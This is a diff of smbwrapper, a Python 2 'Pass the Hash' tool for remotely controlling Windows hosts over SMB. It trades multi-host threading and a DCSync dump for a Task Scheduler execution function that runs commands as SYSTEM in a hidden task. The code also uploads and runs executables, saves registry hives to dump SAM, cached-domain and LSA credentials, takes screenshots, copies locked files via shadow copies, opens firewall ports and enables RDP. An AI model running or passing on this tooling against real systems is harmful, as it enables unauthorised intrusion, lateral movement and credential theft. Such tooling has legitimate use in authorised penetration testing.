@@ -17,21 +17,21 @@
 
 import sys, os, time, string, socket, subprocess, inspect
 
-from multiprocessing import Process
-
-try:
-	from netaddr import IPNetwork
-except:
-	print "[!] Please install the python-netaddr extension."
-	sys.exit(1)
-
 try:
 	import sqlite3
 except:
 	print "[!] Please install python-sqlite3 extension."
-	sys.exit(1)
+	sys.exit(0)
 
-__version__ = '1.0.2alpha'
+try:
+	from impacket.dcerpc.v5 import tsch, transport
+	from impacket.dcerpc.v5.dtypes import NULL
+	from impacket.smbconnection import SMBConnection, SessionError
+except:
+	print "[!] Please install impacket extension."
+	sys.exit(0)
+
+__version__ = '1.1.0alpha'
 __author__ = 'jrm`'
 __description__ = 'Run stuff remotely - Pass the Hash'
 
@@ -45,61 +45,19 @@ TOOLS = {
 	'socat.tar': BASEDIR + '/win/socat.tar',
 	'tar': BASEDIR + '/win/tar.exe',
 	'nircmd': BASEDIR + '/win/nircmd.exe',
-	'runastask': BASEDIR + '/win/runastask.exe',
 	'logparser': BASEDIR + '/win/logparser.exe',
-	'mbsa': {'dll': BASEDIR + '/win/mbsa/%s/wusscan.dll', 'exe': BASEDIR + '/win/mbsa/%s/mbsacli.exe', 'cab': BASEDIR + '/win/mbsa/wsusscn2.cab', 'bat': BASEDIR + '/win/mbsa/mbsa.bat'},
+	'mbsa': {'dll': BASEDIR + '/win/mbsa/$ARCH$/wusscan.dll', 'exe': BASEDIR + '/win/mbsa/$ARCH$/mbsacli.exe', 'cab': BASEDIR + '/win/mbsa/wsusscn2.cab', 'bat': BASEDIR + '/win/mbsa/mbsa.bat'},
 }
-
 CONF = {
 	'system': False,
 	'creds_file': os.environ['HOME'] + '/.smbwrapper.vault',
 	'verbose': True,
+	'smb_domain': '',
 	'smb_user': '',
 	'smb_pass': '',
 	'smb_hash': '',
 	'smb_ip': '',
-	'threaded_mode': False,
 }
-
-def hostname_or_range_to_ip_list(hostname_or_range):
-	# If this is an IP or IP range (CIDR representation)
-	try:
-		return [str(i) for i in IPNetwork(hostname_or_range)]
-	except:
-		pass
-
-	# If this is a hostname
-	# If this fails, we have a problem with the input.
-	try:
-		return socket.gethostbyname_ex(hostname_or_range)[2]
-	except:
-		text("[!] Unable to resolve: %s" % (hostname_or_range))
-
-	return []
-
-def ip_argument_to_ip_list(input):
-	ip_list = []
-
-	if os.path.exists(sys.argv[2]):
-		with open(sys.argv[2], "r") as f:
-			for line in f:
-				ip_list += hostname_or_range_to_ip_list(line.strip())
-	else:
-			ip_list = hostname_or_range_to_ip_list(sys.argv[2])
-
-	return ip_list
-
-def start_threaded_command(command, ip):
-	CONF['smb_ip'] = ip
-
-	if sys.argv[1] not in ['rdp', 'mount']:
-		check_host()
-
-	try:
-		globals()[command]()
-
-	except KeyboardInterrupt:
-		text("\r[*] Stopping thread...", 1)
 
 def main():
 	sys.argv[0] = os.path.basename(sys.argv[0])
@@ -128,52 +86,25 @@ def main():
 
 	# Check command validity and jump to main function
 	command = 'smb_%s' % sys.argv[1]
-
 	if command in dict(get_commands()).keys():
 
 		if len(sys.argv) < 3:
 			usage()
 
-		if sys.argv[1] not in ['creds', 'hash', 'dcsync'] and 'update' not in sys.argv:
-			#
-			# Here starts the multiprocessing part.
-			#
-			# Important note:
-			#
-			# Variable definition on a multiprocessed "thread" is independant
-			#   from the others threads.
-			# This means a variable defined in the main-thread will be available
-			#   in the childs but every changes made in the childs won't be
-			#   available for the main thread or the other threads.
-			# In this particular case, this is greatly helping us.
-			ip_list = []
+		if sys.argv[1] not in ['creds', 'hash'] and 'update' not in sys.argv:
 
-			# First, we need to check if the ip specified is:
-			#   - A file containing unique IPs
-			#   - An ip specification (ip/range)
-			# Whatever the mode is, we need to compute all possible IPs from this.
-			ip_list = ip_argument_to_ip_list(sys.argv[2])
-			ip_list = list(set(ip_list))
+			try:
+				CONF['smb_ip'] = socket.gethostbyname(sys.argv[2])
+			except socket.gaierror:
+				text("[!] Unable to resolve hostname.", 1)
+			except:
+				usage()
 
-			# We keep track of a process list to join them later on.
-			process_list = []
+			if sys.argv[1] not in ['rdp', 'mount']:
+				check_host()
 
-			if len(ip_list) > 1:
-				CONF["threaded_mode"] = True
+		globals()[command]()
 
-			for ip in ip_list:
-				ip = str(ip).strip()
-
-				# Start the threads and add them to the process list.
-				p = Process(target=start_threaded_command, args=(command, ip))
-				p.start()
-				process_list.append(p)
-
-			# Finally, we wait for each thread to finish.
-			for p in process_list:
-				p.join()
-		else:
-			globals()[command]()
 	else:
 		text("[!] Not a valid smbwrapper command.", 1)
 
@@ -184,26 +115,21 @@ def text(txt, e = False):
 
 	if CONF['verbose']:
 
-		if txt[0] == "\n":
-			chars = txt[1:4]
-			index = 4
-		else:
-			chars = txt[0:3]
-			index = 3
+		chars = txt[0:3]
 
-		if chars == '[*]':
-			ret = color(txt[:index], 2, 1) + txt[index:]
-		elif chars == '[!]':
-			ret = color(txt[:index], 1, 1) + txt[index:]
-		elif chars == '[i]':
-			ret = color(txt[:index], 3, 1)
+		if txt[0:3] == '[*]':
+			ret = color('[*]', 2, 1) + txt[3:]
+		elif txt[0:3] == '[!]':
+			ret = color('[!]', 1, 1) + txt[3:]
+		elif txt[0:3] == '[i]':
+			ret = color(txt, 3, 1)
 		else:
 			ret = txt
 
 	print ret
 
-	if e:
-		sys.exit(1)
+	if e is not False:
+		sys.exit(0)
 
 def check_vault():
 
@@ -219,7 +145,7 @@ def check_creds():
 	check_tool('smbclient')
 	check = smbclient('quit')
 
-	if 'NT_STATUS' in check:
+	if 'session setup failed' in check or 'tree connect failed' in check:
 		text('[!] %s' % check, 1)
 
 	return True
@@ -232,20 +158,20 @@ def check_tool(tool):
 
 def check_host():
 	try:
-		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 		sock.settimeout(2)
 		sock.connect((CONF['smb_ip'], 445))
 		sock.close()
 	except:
-		text("[!] %s Error(check_host): port 445 unreachable" % CONF['smb_ip'], 1)
+		text("[!] %s: port 445 unreachable" % sys.argv[2], 1)
 
 def check_path(path):
-	if '%s' in path:
-		check_path(path % 'x86')
-		check_path(path % 'x64')
+	if '$ARCH$' in path:
+		check_path(path.replace('$ARCH$', 'x86'))
+		check_path(path.replace('$ARCH$', 'x64'))
 	else:
 		if not os.path.exists(path):
-			text("[!] %s Error(check_path): %s: file not found." % (CONF['smb_ip'], path), 1)
+			text("[!] %s: file not found." % path, 1)
 
 	return True
 
@@ -261,6 +187,17 @@ def get_commands():
 		commands.append((funcs[k],  str(globals()[funcs[k]].__doc__).strip()))
 
 	return commands
+
+def get_domain():
+	if '\\' in CONF['smb_user']:
+		CONF['smb_user'] = CONF['smb_user'].replace('\\', '/')
+
+	if '/' in CONF['smb_user']:
+		CONF['smb_user'] = CONF['smb_user'].split('/')[1]
+		CONF['smb_domain'] = CONF['smb_user'].split('/')[0]
+	else:
+		CONF['smb_user'] = CONF['smb_user']
+		CONF['smb_domain'] = ''
 
 def usage():
 
@@ -279,7 +216,7 @@ def usage():
 
 	else:
 		print ""
-		print color("Command usage:\n", 7, 4);
+		print color("Command usage:\n", 7, 4);	
 
 	for cmd in get_commands():
 		if c == 'help' or c == cmd[0][4:]:
@@ -325,7 +262,7 @@ def creds_from_cmdline():
 		CONF['smb_pass'] = ''
 		CONF['smb_hash'] = sys.argv[4]
 		os.environ['SMBHASH'] = '00000000000000000000000000000000:' + CONF['smb_hash']
-
+	
 	else:
 		CONF['smb_pass'] = sys.argv[4]
 		CONF['smb_hash'] = ntlm_hash(sys.argv[4])
@@ -343,12 +280,7 @@ def set_creds(length):
 	else:
 		usage()
 
-	CONF['smb_user'] = CONF['smb_user'].replace('\\', '/')
-
-	if '/' in CONF['smb_user']:
-		CONF['smb_domain'], CONF['smb_user'] = CONF['smb_user'].split('/')
-	else:
-		CONF['smb_domain'] = ''
+	get_domain()
 
 def ntlm_hash(str):
 	import hashlib, binascii
@@ -363,33 +295,43 @@ def download_file(src, dst, statusbar = True):
 
 	meta = u.info()
 	file_size = int(meta.getheaders("Content-Length")[0])
-
+	
 	if file_size == 0:
-		text("[!] %s Error(download_file): File empty." % (CONF['smb_ip']))
+		text("[!] Error: File empty.")
+
+	text("[*] File Size: %s" % file_size)
 
 	file_size_dl = 0
 	block_sz = 8192
 
-	text("[i][%s] File size: %i." % (CONF['smb_ip'], file_size))
-
 	try:
 		while True:
 			buffer = u.read(block_sz)
-
+		
 			if not buffer:
 				break
-
+		
 			file_size_dl += len(buffer)
 			f.write(buffer)
+		
+			status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100. / file_size)
+			status = status + chr(8)*(len(status)+1)
+		
+			if statusbar:
+				sys.stdout.write(status)
+
+		print ""
+
 	except KeyboardInterrupt:
 		f.close()
-		text("[*] %s Exiting..." % (CONF['smb_ip']), 1)
+		print "\r"
+		text("[*] Exiting...", 1)
 
 	f.close()
 
 def smbclient(cmd):
 	check_tool('smbclient')
-	creds = '%s/%s%%%s' % (CONF['smb_domain'], CONF['smb_user'], CONF['smb_pass'])
+	creds = '%s%%%s' % (CONF['smb_user'], CONF['smb_pass'])
 
 	run = []
 	run.append(TOOLS['smbclient'])
@@ -400,14 +342,14 @@ def smbclient(cmd):
 	run.append(cmd)
 
 	process = subprocess.Popen(run, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
-
+	
 	ret = process.stdout.read()
 	ret = ret.replace('\x00', '')
 	return ret.strip()
 
 def winexe(cmd):
 	check_tool('winexe')
-	creds = '%s/%s%%%s' % (CONF['smb_domain'], CONF['smb_user'], CONF['smb_pass'])
+	creds = '%s%%%s' % (CONF['smb_user'], CONF['smb_pass'])
 
 	run = []
 	run.append(TOOLS['winexe'])
@@ -422,7 +364,7 @@ def winexe(cmd):
 
 	if not cmd.lower().startswith('cmd'):
 		process = subprocess.Popen(run, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
-
+		
 		ret = process.stdout.read()
 		ret = ret.replace('\x00', '')
 		return ret.strip()
@@ -436,7 +378,7 @@ def os_architecture():
 
 def screen_resolution():
 	xrandr = subprocess.Popen(['xrandr', '--current'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.readlines()
-
+	
 	for l in xrandr:
 		if '*' in l:
 			return l.split()[0].split('x')
@@ -444,17 +386,21 @@ def screen_resolution():
 	return ['1024', '768']
 
 def up_and_exec(localcmd, delete_after = True):
+
 	if os.path.exists(localcmd[0]):
 
 		smbclient('put "%s" "\\windows\\temp\\msiexec.exe"' % localcmd[0])
 		ret = winexe('\\windows\\temp\\msiexec.exe %s' % ' '.join(localcmd[1:]))
 
+		print '\\windows\\temp\\msiexec.exe %s' % ' '.join(localcmd[1:])
+
 		if delete_after:
 			smbclient('del "\\windows\\temp\\msiexec.exe"')
 
 		return ret
+
 	else:
-		text("[!] %s Error(up_and_exec): %s: file not found." % (CONF['smb_ip'], localcmd[0]), 1)
+		text("[!] %s: file not found." % localcmd[0], 1)
 
 def smb_creds():
 	"""
@@ -468,7 +414,7 @@ def smb_creds():
 	if sys.argv[2] == 'list':
 		cursor = sqlite3.connect(CONF['creds_file'])
 		res = cursor.execute('SELECT * FROM creds')
-
+		
 		for row in res:
 			print 'Active   : %s' % ('*' if row[0] != 0 else '')
 			print 'Username : %s' % row[1]
@@ -476,7 +422,7 @@ def smb_creds():
 			print 'NT Hash  : %s' % row[3]
 			print 'Comment  : %s' % row[4]
 			print "-- "
-
+		
 		cursor.close()
 	else:
 		u = p = h = c = ''
@@ -529,7 +475,7 @@ def smb_creds():
 			cursor.close()
 
 	if sys.argv[2] == 'del':
-
+		
 		if len(sys.argv) == 4:
 
 			cursor = sqlite3.connect(CONF['creds_file'])
@@ -545,7 +491,7 @@ def smb_creds():
 			cursor.close()
 
 	if sys.argv[2] == 'use':
-
+		
 		if len(sys.argv) == 4:
 
 			cursor = sqlite3.connect(CONF['creds_file'])
@@ -563,35 +509,27 @@ def smb_creds():
 
 def smb_exec():
 	"""
-	[-s] <ip/file/range> [ user ] [ passwd/nthash ] <cmd>
+	[-s] <ip> [ user ] [ passwd/nthash ] <cmd>
 	Execute a command remotely (use "cmd" for a command prompt)
-	Warning: When using several IPs, it is strongly recommended not
-		not to run an interactive cmd (due to parallelism).
 	"""
 
 	set_creds(4)
 	check_creds()
-	ret = winexe(' '.join(sys.argv[3:]))
-
-	if CONF['threaded_mode']:
-		text("[*] %s Execution result\n%s" % (CONF['smb_ip'], ret))
-	else:
-		print ret
+	print winexe(' '.join(sys.argv[3:]))
 
 def smb_upexec():
 	"""
-	[-s] <ip/file/range> [ user ] [ passwd/nthash ] <localfile.exe [-arg1 [-argx]]>
+	[-s] <ip> [ user ] [ passwd/nthash ] <localfile.exe [-arg1 [-argx]]>
 	Upload a file and run it remotely with the specified arguments
 	"""
 
 	set_creds(4)
 	check_creds()
-	ret = up_and_exec(sys.argv[3:])
-	text("\n[*] %s Execution result\n%s\n" % (CONF['smb_ip'], ret))
+	print up_and_exec(sys.argv[3:])
 
 def smb_upload():
 	"""
-	[-s] <ip/file/range> [ user ] [ passwd/nthash ] <localfile> <remotefile>
+	[-s] <ip> [ user ] [ passwd/nthash ] <localfile> <remotefile>
 	Upload a file to the host
 	"""
 
@@ -602,17 +540,14 @@ def smb_upload():
 		usage()
 
 	if os.path.exists(sys.argv[3]):
-		ret = smbclient('put "%s" "%s"' % (sys.argv[3], sys.argv[4]))
-		text("\n[*] %s Upload result\n%s\n" % (CONF['smb_ip'], ret))
+		print smbclient('put "%s" "%s"' % (sys.argv[3], sys.argv[4]))
 	else:
-		text("[!] %s Error(smb_upload): %s: file not found." % (CONF['smb_ip'], sys.argv[3]), 1)
+		text("[!] %s: file not found." % sys.argv[3], 1)
 
 def smb_download():
 	"""
-	[-s] <ip/file/range> [ user ] [ passwd/nthash ] <remotefile> <localfile>
-	Download a file from the host.
-	Note: smbwrapper will automatically rename the localfile using the target ip.
-		This only happens when running against several hosts.
+	[-s] <ip> [ user ] [ passwd/nthash ] <remotefile> <localfile>
+	Download a file from the host
 	"""
 
 	set_creds(5)
@@ -621,74 +556,139 @@ def smb_download():
 	if len(sys.argv) != 5:
 		usage()
 
-	if CONF["threaded_mode"]:
-		localfile = "%s-%s" % (sys.argv[4], CONF["smb_ip"])
-	else:
-		localfile = sys.argv[4]
+	print smbclient('get "%s" "%s"' % (sys.argv[3], sys.argv[4]))
 
-	remotefile = sys.argv[3]
-
-	ret = smbclient('get "%s" "%s"' % (remotefile, localfile))
-	text("\n[*] %s Download result\n%s\n" % (CONF['smb_ip'], ret))
-
-def smb_check():
+def smb_atexec(cmd=None):
 	"""
-	[-s] <ip/file/range> [ user ] [ passwd/nthash ]
-	Check whether the current credentials work on the specified IP or range
+	[-s] <ip> [ user ] [ passwd/nthash ] <cmd>
+	Execute a command remotely using the Task Scheduler
 	"""
 
-	set_creds(3)
-	check = smbclient('quit')
-
-	if 'NT_STATUS' in check:
-		text('[!] %s: %s' % (current_ip.strip(), check))
-	else:
-		text('[*] %s: Login OK' % current_ip.strip())
+	### Inspired from impacket's atexec.py ###
+	def output_callback(data):
+		print data
 
 
-def smb_dcsync():
-	"""
-	[-s] <ip> [ user ] [ passwd/nthash ] [ -history ]
-	Dump domain users hashes using DRSUAPI method (AD Replication)
-	"""
-	if CONF["threaded_mode"]:
-		text("[!] Function not available when running for several hosts.", 1)
+	if len(inspect.stack()) == 3: # Function called directly from command line
 
-	### The following is using secretsdump.py from impacket ###
+		set_creds(4)
+		check_creds()
+
+		cmd = sys.argv[3]
+	
+	rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\atsvc]' % CONF['smb_ip'])
+	if hasattr(rpctransport, 'set_credentials'):
+		rpctransport.set_credentials(CONF['smb_user'], CONF['smb_hash'], CONF['smb_domain'], '00000000000000000000000000000000', CONF['smb_hash'])
+
+	print CONF
+
 	try:
-		import secretsdump
-	except:
-		print color('[!] Please install python-impacket to use this function.')
-		sys.exit(1)
+		dce = rpctransport.get_dce_rpc()
+		dce.set_credentials(*rpctransport.get_credentials())
+		dce.connect()
+		dce.bind(tsch.MSRPC_UUID_TSCHS)
 
-	set_creds(3)
+	except SessionError, e:
+		print color('[!] ') + e.getErrorString()[1]
+		sys,exit(0)
 
-	class opts:
-		use_vss = False
-		aesKey = None
-		system = None
-		security = None
-		sam = None
-		ntds = None
-		history = True if '-history' in sys.argv else False
-		outputfile = None
-		k = False
-		just_dc = False
-		just_dc_ntlm = True
-		pwd_last_set = False
-		hashes = None
+	tmpName = 'smbwrpr'
+	tmpFileName = tmpName + '.tmp'
 
-	options = opts()
+	xml = """<?xml version="1.0" encoding="UTF-16"?>
+	<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+	<Triggers>
+	<CalendarTrigger>
+	  <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
+	  <Enabled>true</Enabled>
+	  <ScheduleByDay>
+		<DaysInterval>1</DaysInterval>
+	  </ScheduleByDay>
+	</CalendarTrigger>
+	</Triggers>
+	<Principals>
+	<Principal id="LocalSystem">
+	  <UserId>S-1-5-18</UserId>
+	  <RunLevel>HighestAvailable</RunLevel>
+	</Principal>
+	</Principals>
+	<Settings>
+	<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+	<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+	<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+	<AllowHardTerminate>true</AllowHardTerminate>
+	<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+	<IdleSettings>
+	  <StopOnIdleEnd>true</StopOnIdleEnd>
+	  <RestartOnIdle>false</RestartOnIdle>
+	</IdleSettings>
+	<AllowStartOnDemand>true</AllowStartOnDemand>
+	<Enabled>true</Enabled>
+	<Hidden>true</Hidden>
+	<RunOnlyIfIdle>false</RunOnlyIfIdle>
+	<WakeToRun>false</WakeToRun>
+	<ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+	<Priority>7</Priority>
+	</Settings>
+	<Actions Context="LocalSystem">
+	<Exec>
+	  <Command>cmd.exe</Command>
+	  <Arguments>/C %s &gt; %%windir%%\\Temp\\%s 2&gt;&amp;1</Arguments>
+	</Exec>
+	</Actions>
+	</Task>
+	""" % (cmd, tmpFileName)
+	
+	taskCreated = False
+	
+	try:
+		tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
+		taskCreated = True
+		tsch.hSchRpcRun(dce, '\\%s' % tmpName)
+		done = False
 
-	if len(CONF['smb_hash']):
-		opts.hashes = '00000000000000000000000000000000:%s' % CONF['smb_hash']
+		while not done:
+			resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
+			if resp['pLastRuntime']['wYear'] != 0:
+				done = True
+			else:
+				time.sleep(2)
+		tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
+		taskCreated = False
 
-	dumper = secretsdump.DumpSecrets(CONF['smb_ip'], username=CONF['smb_user'], domain=CONF['smb_domain'], password=CONF['smb_pass'], options=options)
-	dumper.dump()
+	except tsch.DCERPCSessionError, e:
+		logging.error(e)
+		e.get_packet().dump()
+
+	finally:
+		if taskCreated is True:
+			tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
+
+	smbConnection = rpctransport.get_smb_connection()
+	waitOnce = True
+
+	while True:
+		try:
+			smbConnection.getFile('ADMIN$', 'Temp\\%s' % tmpFileName, output_callback)
+			break
+		except Exception, e:
+			if str(e).find('SHARING') > 0:
+				time.sleep(3)
+			elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
+				if waitOnce is True:
+					# We're giving it the chance to flush the file before giving up
+					time.sleep(3)
+					waitOnce = False
+				else:
+					raise
+			else:
+				raise
+	smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % tmpFileName)
+	dce.disconnect()
 
 def smb_creddump():
 	"""
-	[-s] <ip/file/range> [ user ] [ passwd/nthash ]
+	[-s] <ip> [ user ] [ passwd/nthash ]
 	Extract SAM, SECURITY, SYSTEM hives and dump SAM, DCC, LSA Secrets
 	"""
 
@@ -700,11 +700,11 @@ def smb_creddump():
 
 	set_creds(3)
 
-	text("[*] %s Extracting hives..." % (CONF["smb_ip"]))
+	text("[*] Extracting hives...")
 
-	tmpfile = '/tmp/cred_run.%s.bat' % (CONF["smb_ip"])
+	tmpfile = '/tmp/cred_run.bat'
 
-	bat = ['@echo off', 'cd \\windows\\temp',
+	bat = ['@echo off', 'cd \\windows\\temp', 
 		'reg save HKLM\\SAM sam.hive /y',
 		'reg save HKLM\\SYSTEM system.hive /y',
 		'reg save HKLM\\SECURITY security.hive /y']
@@ -712,42 +712,36 @@ def smb_creddump():
 	open(tmpfile, 'w').write('\r\n'.join(bat))
 
 	smbclient('put "%s" "\\windows\\temp\\cred_run.bat"' % tmpfile)
-	text("[*] %s Running cred_run.bat\n%s\n" % (CONF["smb_ip"], winexe('\\windows\\temp\\cred_run.bat')))
+	print winexe('\\windows\\temp\\cred_run.bat')
 
-	text("[*] %s Downloading hives..." % (CONF["smb_ip"]))
+	text("[*] Downloading hives...")
 	smbclient('get "\\windows\\temp\\sam.hive" "%s_sam.hive"' % CONF['smb_ip'])
 	smbclient('get "\\windows\\temp\\system.hive" "%s_system.hive"' % CONF['smb_ip'])
 	smbclient('get "\\windows\\temp\\security.hive" "%s_security.hive"' % CONF['smb_ip'])
 
-	text("[*] %s Removing temp files..." % (CONF["smb_ip"]))
+	text("[*] Removing temp files...")
 	smbclient('del "\\windows\\temp\\cred_run.bat"')
 	smbclient('del "\\windows\\temp\\sam.hive"')
 	smbclient('del "\\windows\\temp\\system.hive"')
 	smbclient('del "\\windows\\temp\\security.hive"')
 	os.unlink(tmpfile)
 
-	text("[*] %s Extracting SAM credentials..." % (CONF["smb_ip"]))
-	hashes = hashdump.dump_file_hashes(CONF['smb_ip'] + '_system.hive', CONF['smb_ip'] + '_sam.hive')
+	text("[*] Extracting SAM credentials...")
+	hashdump.dump_file_hashes(CONF['smb_ip'] + '_system.hive', CONF['smb_ip'] + '_sam.hive')
 
-	text("[*] %s Extracting MSCASH credentials..." % (CONF["smb_ip"]))
-	mscash = domcachedump.dump_file_hashes(CONF['smb_ip'] + '_system.hive', CONF['smb_ip'] + '_security.hive')
-
-	text("[*] %s SAM hashes\n%s" % (CONF["smb_ip"], "\n".join(hashes)))
-	text("[*] %s MsCash\n%s" % (CONF["smb_ip"], "\n".join(mscash)))
+	text("[*] Extracting MSCASH credentials...")
+	domcachedump.dump_file_hashes(CONF['smb_ip'] + '_system.hive', CONF['smb_ip'] + '_security.hive')
 
 	# Code below ripped from creddump's lsadump.py
-	text("[*] %s Extracting LSA Secrets..." % (CONF["smb_ip"]))
+	text("[*] Extracting LSA Secrets...")
 	try:
 		FILTER = ''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])
 		secrets = lsasecrets.get_file_secrets(CONF['smb_ip'] + '_system.hive', CONF['smb_ip'] + '_security.hive')
 
 		if not secrets:
-			text("[!] %s Error(smb_creddump): Unable to read LSA secrets." % (CONF["smb_ip"]))
+			text("[!] Unable to read LSA secrets.")
 
 		else:
-
-			secrets = []
-
 			for k in secrets:
 				N = 0
 				length = 16
@@ -758,23 +752,19 @@ def smb_creddump():
 					s = s.translate(FILTER)
 					result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
 					N += length
-
-				secrets.append(k)
-				secrets.append(result)
-
-			text("[*] %s LSA Secrets\n%s" % (CONF["smb_ip"], "\n".join(secrets)))
+				
+				print k
+				print result
 	except:
 		pass
 
-	text("[*] %s SYSTEM, SAM and SECURITY hives were saved in the current directory." % (CONF["smb_ip"]))
+	text("[*] SYSTEM, SAM and SECURITY hives were saved in the current directory.")
 
 def smb_lastlog():
 	"""
 	[-s] <ip> [ user ] [ passwd/nthash ] <username>
 	Retrieves last known IPs for given user from the DC's Event Logs. Provide DC IP.
 	"""
-	if CONF["threaded_mode"]:
-		text("[!] Function not available when running for several hosts.", 1)
 
 	set_creds(4)
 	check_tool('logparser')
@@ -788,44 +778,41 @@ def smb_lastlog():
 
 def smb_scrshot():
 	"""
-	[-s] <ip/file/range> [ user ] [ passwd/nthash ]
+	[-s] <ip> [ user ] [ passwd/nthash ]
 	Takes a screenshot of the active session
 	"""
 
 	set_creds(3)
-	check_tool('runastask')
 	check_tool('nircmd')
 
-	text("[*] %s Uploading tools..." % (CONF["smb_ip"]))
-	smbclient('put "%s" "\\windows\\temp\\r.exe"' % TOOLS['runastask'])
+	text("[*] Uploading tools...")
 	smbclient('put "%s" "\\windows\\temp\\n.exe"' % TOOLS['nircmd'])
 
-	text("[*] %s Capturing screenshot..." % (CONF["smb_ip"]))
-	filename = '/tmp/screenshot.%s.%s.png' % (CONF["smb_ip"], str(time.time()))
+	text("[*] Capturing screenshot...")
+	filename = '/tmp/screenshot.%s.png' % str(time.time())
 
-	winexe('\\windows\\temp\\r.exe %s C:\\windows\\temp\\n.exe savescreenshotfull C:\\windows\\temp\\s.png' % CONF['smb_user'])
+	smb_atexec('C:\\windows\\temp\\n.exe savescreenshotfull C:\\windows\\temp\\s.png')
 	smbclient('get "\\windows\\temp\\s.png" "%s"' % filename);
 
-	text("[*] %s Cleaning files..." % (CONF["smb_ip"]))
+	text("[*] Cleaning files...")
 	smbclient('del "\\windows\\temp\\n.exe"')
 	smbclient('del "\\windows\\temp\\r.exe"')
 	smbclient('del "\\windows\\temp\\s.png"')
 
 	if os.path.exists(filename):
-		text("[*] %s Screenshot saved under %s." % (CONF["smb_ip"], filename))
-		os.system('display "%s" &' % filename)
-		text("[*] %s Done." % (CONF["smb_ip"]))
 
+		text("[*] Screenshot saved under %s." % filename)
+		os.system('display "%s" &' % filename)
+		text("[*] Done.")
+	
 	else:
-		text("[!] %s Error(smb_scrshot): Is the user logged in?." % (CONF["smb_ip"]), 1)
+		text("[!] Failed. Is the user logged in?.", 1)
 
 def smb_vsscpy():
 	"""
 	[-s] <ip> [ user ] [ passwd/nthash ] <remotefile> <localfile>
 	Use shadow copies to download a locked file from the host
 	"""
-	if CONF["threaded_mode"]:
-		text("[!] Function not available when running for several hosts.", 1)
 
 	check_tool('vsscpy')
 	set_creds(5)
@@ -836,32 +823,29 @@ def smb_vsscpy():
 	check_creds()
 
 	remotefile = sys.argv[3]
-	localfile = "%s-%s" % (sys.argv[4], CONF["smb_ip"])
+	localfile = sys.argv[4]
 
-	text("[*] %s Uploading script..." % (CONF["smb_ip"]))
+	text("[*] Uploading script...")
 	smbclient('put "%s" "\\windows\\temp\\vsscpy.vbs"' % TOOLS['vsscpy'])
 
-	text("[*] %s Running script..." % (CONF["smb_ip"]))
+	text("[*] Running script...")
 	winexe('cscript \\windows\\temp\\vsscpy.vbs "%s"' % remotefile.lower().replace('c:', ''))
 
-	text("[*] %s Downloading file to '%s'..." % (CONF["smb_ip"], localfile))
+	text("[*] Downloading file to '%s'..." % localfile)
 	smbclient('get "\\windows\\temp\\temp.tmp" "%s"' % localfile)
 
-	text("[*] %s Removing temp files..." % (CONF["smb_ip"]))
+	text("[*] Removing temp files...")
 	smbclient('del "\\windows\\temp\\temp.tmp"')
 	smbclient('del "\\windows\\temp\\vsscpy.vbs"')
 
-	text("[*] %s Done." % (CONF["smb_ip"]))
+	text("[*] Done.")
 
 def smb_fwrule(action = None, param = None):
 	"""
 	[-s] <ip> [ user ] [ password ] <add | del> <program path | port number>
 	Create or remove a rule in the Windows firewall
 	"""
-
-	if CONF["threaded_mode"]:
-		text("[!] Function not available when running for several hosts.", 1)
-
+	
 	if len(inspect.stack()) == 3: # Function called directly from command line
 
 		set_creds(5)
@@ -877,13 +861,13 @@ def smb_fwrule(action = None, param = None):
 	param = str(param)
 
 	text("[*] %sing firewall rule..." % ('Add' if action == 'add' else 'Delet'))
-
+	
 	if param.isdigit(): # Adding a port rule
-		ret = winexe('netsh advfirewall firewall %s rule dir=in name="%s" %s protocol=TCP localport=%s' %
+		ret = winexe('netsh advfirewall firewall %s rule dir=in name="%s" %s protocol=TCP localport=%s' % 
 			(action, name, 'action=allow' if action == 'add' else '', param))
 
 	else: # Adding a program rule
-		ret = winexe('netsh advfirewall firewall %s rule dir=out name="%s" %s program="%s"' %
+		ret = winexe('netsh advfirewall firewall %s rule dir=out name="%s" %s program="%s"' % 
 			(action, name, 'action=allow' if action == 'add' else '', param))
 
 	if 'Ok.' in ret:
@@ -896,9 +880,6 @@ def smb_mount():
 	<ip> [ user ] [ password ] <share> <localpath>
 	Mount a remote share locally via CIFS (Pass-the-Hash not available)
 	"""
-
-	if CONF["threaded_mode"]:
-		text("[!] Function not available when running for several hosts.", 1)
 
 	set_creds(5)
 
@@ -930,19 +911,16 @@ def smb_rdp():
 	Open a Remote Desktop session using xfreerdp (Pass-the-Hash = restricted admin)
 	"""
 
-	if CONF["threaded_mode"]:
-		text("[!] Function not available when running for several hosts.", 1)
-
 	if 'enable' in sys.argv:
 		set_creds(4)
-		text("[*] %s Updating Registry..." % (CONF["smb_ip"]))
+		text("[*] Updating Registry...")
 		winexe('reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
 		smb_fwrule('add', 3389)
 		sys.exit(0)
 
 	if 'disable' in sys.argv:
 		set_creds(4)
-		text("[*] %s Updating Registry..." % (CONF["smb_ip"]))
+		text("[*] Updating Registry...")
